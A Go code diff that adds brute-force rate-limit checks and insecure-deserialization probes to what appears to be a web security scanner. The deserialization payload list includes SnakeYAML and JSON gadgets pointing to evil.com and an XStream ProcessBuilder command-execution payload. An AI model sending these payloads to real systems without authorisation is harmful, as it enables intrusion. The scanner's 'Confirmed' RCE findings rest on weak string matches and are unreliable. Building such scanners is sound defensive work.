@@ -218,6 +218,16 @@ var CustomChecks = []CustomCheck{
 		Description: "XSS injection probes (stored, DOM, Markdown, SVG vectors)",
 		Check:       checkXSSProbes,
 	},
+	{
+		Name:        "rate-limiting",
+		Description: "Rate limiting / brute-force resistance check (87+ H1 reports)",
+		Check:       checkRateLimiting,
+	},
+	{
+		Name:        "deserialization",
+		Description: "Insecure deserialization probes (Java, PHP, Python, Ruby)",
+		Check:       checkDeserialization,
+	},
 }
 
 func checkIDOR(target string) ([]types.Finding, error) {
@@ -2348,6 +2358,233 @@ func checkXSSProbes(target string) ([]types.Finding, error) {
 						Verified:     true,
 					})
 				}
+			}
+		}
+	}
+
+	return findings, nil
+}
+
+var rateLimitEndpoints = []struct {
+	path       string
+	method     string
+	threshold  int
+	label      string
+}{
+	{"/login", "POST", 20, "Login"},
+	{"/api/login", "POST", 20, "API Login"},
+	{"/register", "POST", 20, "Registration"},
+	{"/api/register", "POST", 20, "API Registration"},
+	{"/forgot-password", "POST", 20, "Forgot Password"},
+	{"/api/forgot-password", "POST", 20, "API Forgot Password"},
+	{"/reset-password", "POST", 20, "Password Reset"},
+	{"/api/reset-password", "POST", 20, "API Password Reset"},
+	{"/otp/verify", "POST", 20, "OTP Verification"},
+	{"/api/otp/verify", "POST", 20, "API OTP Verification"},
+	{"/2fa/verify", "POST", 20, "2FA Verification"},
+	{"/api/2fa/verify", "POST", 20, "API 2FA Verification"},
+}
+
+func checkRateLimiting(target string) ([]types.Finding, error) {
+	var findings []types.Finding
+
+	for _, ep := range rateLimitEndpoints {
+		u := strings.TrimRight(target, "/") + ep.path
+		start := time.Now()
+		successes := 0
+		totalSent := 0
+
+		for i := 0; i < ep.threshold && time.Since(start) < 15*time.Second; i++ {
+			var req *http.Request
+			var err error
+			if ep.method == "POST" {
+				req, err = http.NewRequest("POST", u, bytes.NewReader([]byte(`{"test":"true"}`)))
+			} else {
+				req, err = http.NewRequest("GET", u, nil)
+			}
+			if err != nil {
+				continue
+			}
+			req.Header.Set("Content-Type", "application/json")
+			resp, err := sharedClient.Do(req)
+			if err != nil {
+				continue
+			}
+			totalSent++
+			if resp.StatusCode == 429 {
+				resp.Body.Close()
+				break
+			}
+			if resp.StatusCode == 200 || resp.StatusCode == 302 || resp.StatusCode == 401 {
+				successes++
+			}
+			resp.Body.Close()
+			time.Sleep(50 * time.Millisecond)
+		}
+
+		ratio := float64(successes) / float64(totalSent)
+		if totalSent >= 10 && ratio > 0.8 && totalSent >= ep.threshold/2 {
+			findings = append(findings, types.Finding{
+				ID:           fmt.Sprintf("ratelimit-%x", sha256.Sum256([]byte(u)))[:24],
+				Title:        fmt.Sprintf("Missing Rate Limiting — %s (%d/%d requests succeeded)", ep.label, successes, totalSent),
+				Severity:     types.SeverityMedium,
+				AffectedURL:  u,
+				CWE:          []string{"CWE-307"},
+				OWASP2025:    "Identification and Authentication Failures",
+				CVSS:         5.3,
+				CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+				Description:  fmt.Sprintf("The %s endpoint at %s does not enforce rate limiting. %d of %d rapid requests succeeded without receiving a 429 (Too Many Requests). An attacker can brute-force credentials or abuse the endpoint.", ep.label, u, successes, totalSent),
+				AttackScenario: fmt.Sprintf("1. Attacker sends %d rapid requests to %s\n2. No rate limiting is enforced (%d succeeded)\n3. Attacker brute-forces user credentials, OTPs, or password reset tokens", totalSent, u, successes),
+				Evidence:     fmt.Sprintf("Sent %d requests in %.0fs\nResponses: %d succeeded (2xx/3xx), %d rate-limited (429)", totalSent, time.Since(start).Seconds(), successes, totalSent-successes),
+				Remediation:  "Implement rate limiting (e.g., 5 requests per minute per IP for login/reset endpoints). Apply progressive delays, CAPTCHA after threshold, and account lockout policies. Use 429 status codes with Retry-After headers.",
+				ToolSource:   "custom-rate-limiting",
+				Timestamp:    time.Now(),
+				Verified:     true,
+			})
+		}
+	}
+
+	return findings, nil
+}
+
+var deserializationPayloads = []struct {
+	contentType string
+	body        string
+	label       string
+	indicator   string
+	severity    types.Severity
+}{
+	{
+		"application/x-java-serialized-object",
+		"\xac\xed\x00\x05\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70",
+		"Java serialized object",
+		"class java.util",
+		types.SeverityCritical,
+	},
+	{
+		"application/php-serialized",
+		`O:8:"stdClass":0:{}`,
+		"PHP serialized object",
+		"__PHP_Incomplete_Class",
+		types.SeverityCritical,
+	},
+	{
+		"application/python-pickle",
+		string([]byte{0x80, 0x04, 0x95}),
+		"Python pickle (v4 protocol)",
+		"S'",
+		types.SeverityCritical,
+	},
+	{
+		"application/yaml",
+		`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com"]]]]`,
+		"Java YAML deserialization (SnakeYAML)",
+		"ScriptEngineManager",
+		types.SeverityCritical,
+	},
+	{
+		"application/json",
+		`{"object":["something",{"@class":"java.net.URL","val":"http://evil.com"}]}`,
+		"JSON deserialization gadget",
+		"@class",
+		types.SeverityCritical,
+	},
+	{
+		"application/xml",
+		`<java>\x3Cobject class="java.lang.ProcessBuilder">\x3Carray class="java.lang.String" length="1">\x3Cvoid index="0">\x3Cstring>id\x3C/string>\x3C/void>\x3C/array>\x3Cvoid method="start">\x3C/object>\x3C/java>`,
+		"Java XStream deserialization RCE",
+		"ProcessBuilder",
+		types.SeverityCritical,
+	},
+	{
+		"application/ruby-marshal",
+		string([]byte{0x04, 0x08, 0x6f, 0x3a, 0x08, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00}),
+		"Ruby Marshal object",
+		"Object",
+		types.SeverityCritical,
+	},
+	{
+		"application/x-www-form-urlencoded",
+		`value=O:8:"stdClass":0:{}`,
+		"PHP deserialization in form data",
+		"__PHP_Incomplete_Class",
+		types.SeverityCritical,
+	},
+}
+
+var deserEndpoints = []string{
+	"/api/deserialize", "/api/process", "/api/import", "/api/upload",
+	"/api/transform", "/api/load", "/api/parse", "/api/convert",
+	"/api/rpc", "/api/soap", "/api/rest", "/api/data",
+	"/api/batch", "/api/bulk",
+}
+
+func checkDeserialization(target string) ([]types.Finding, error) {
+	var findings []types.Finding
+
+	for _, ep := range deserEndpoints {
+		u := strings.TrimRight(target, "/") + ep
+		for _, payload := range deserializationPayloads {
+			req, err := http.NewRequest("POST", u, bytes.NewReader([]byte(payload.body)))
+			if err != nil {
+				continue
+			}
+			req.Header.Set("Content-Type", payload.contentType)
+
+			resp, err := sharedClient.Do(req)
+			if err != nil {
+				continue
+			}
+			body, err := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			if err != nil {
+				continue
+			}
+			bodyStr := string(body)
+
+			if resp.StatusCode == 500 &&
+				(strings.Contains(strings.ToLower(bodyStr), "serializ") ||
+				 strings.Contains(strings.ToLower(bodyStr), "deserializ") ||
+				 strings.Contains(strings.ToLower(bodyStr), "class") ||
+				 strings.Contains(strings.ToLower(bodyStr), "exception") ||
+				 strings.Contains(strings.ToLower(bodyStr), payload.indicator)) {
+				findings = append(findings, types.Finding{
+					ID:           fmt.Sprintf("deser-%x", sha256.Sum256([]byte(u+payload.label)))[:24],
+					Title:        fmt.Sprintf("Potential Insecure Deserialization — %s", payload.label),
+					Severity:     payload.severity,
+					AffectedURL:  u,
+					CWE:          []string{"CWE-502"},
+					OWASP2025:    "Software and Data Integrity Failures",
+					CVSS:         9.8,
+					CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+					Description:  fmt.Sprintf("The endpoint %s processes %s payloads and returns a 500 error with deserialization-related messages. This indicates the server may be vulnerable to deserialization attacks leading to RCE.", u, payload.label),
+					AttackScenario: fmt.Sprintf("1. Attacker sends crafted %s payload to %s\n2. Server deserializes the payload (500 error confirms deserialization)\n3. RCE gadget chain executes arbitrary commands on server", payload.label, u),
+					Evidence:     fmt.Sprintf("Content-Type: %s\nResponse status: 500\nResponse body: %s", payload.contentType, bodyStr[:min(len(bodyStr), 400)]),
+					Remediation:  "Never deserialize untrusted data. Use safe serialization formats (JSON/Protobuf). If required, use whitelist-based type resolution and validate all input before deserialization. Apply CVE patches for known deserialization libraries (Jackson, SnakeYAML, XStream).",
+					ToolSource:   "custom-deserialization",
+					Timestamp:    time.Now(),
+					Verified:     true,
+				})
+			} else if resp.StatusCode == 200 &&
+				(strings.Contains(strings.ToLower(bodyStr), "object") ||
+				 strings.Contains(strings.ToLower(bodyStr), payload.indicator)) {
+				findings = append(findings, types.Finding{
+					ID:           fmt.Sprintf("deser-200-%x", sha256.Sum256([]byte(u+payload.label)))[:24],
+					Title:        fmt.Sprintf("Insecure Deserialization Confirmed — %s", payload.label),
+					Severity:     types.SeverityCritical,
+					AffectedURL:  u,
+					CWE:          []string{"CWE-502"},
+					OWASP2025:    "Software and Data Integrity Failures",
+					CVSS:         9.8,
+					CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+					Description:  fmt.Sprintf("%s deserialized successfully at %s. The server accepted and processed the payload indicating no input validation. This is exploitable for RCE.", payload.label, u),
+					AttackScenario: fmt.Sprintf("1. Attacker sends %s payload to %s\n2. Server successfully deserializes it\n3. Crafted gadget chain achieves RCE on the application server", payload.label, u),
+					Evidence:     fmt.Sprintf("Content-Type: %s\nResponse status: 200 (Accepted)\nIndicates deserialization succeeded", payload.contentType),
+					Remediation:  "Disable deserialization of untrusted input immediately. Implement strict type validation. Use alternative serialization formats like JSON with known schemas.",
+					ToolSource:   "custom-deserialization",
+					Timestamp:    time.Now(),
+					Verified:     true,
+				})
 			}
 		}
 	}
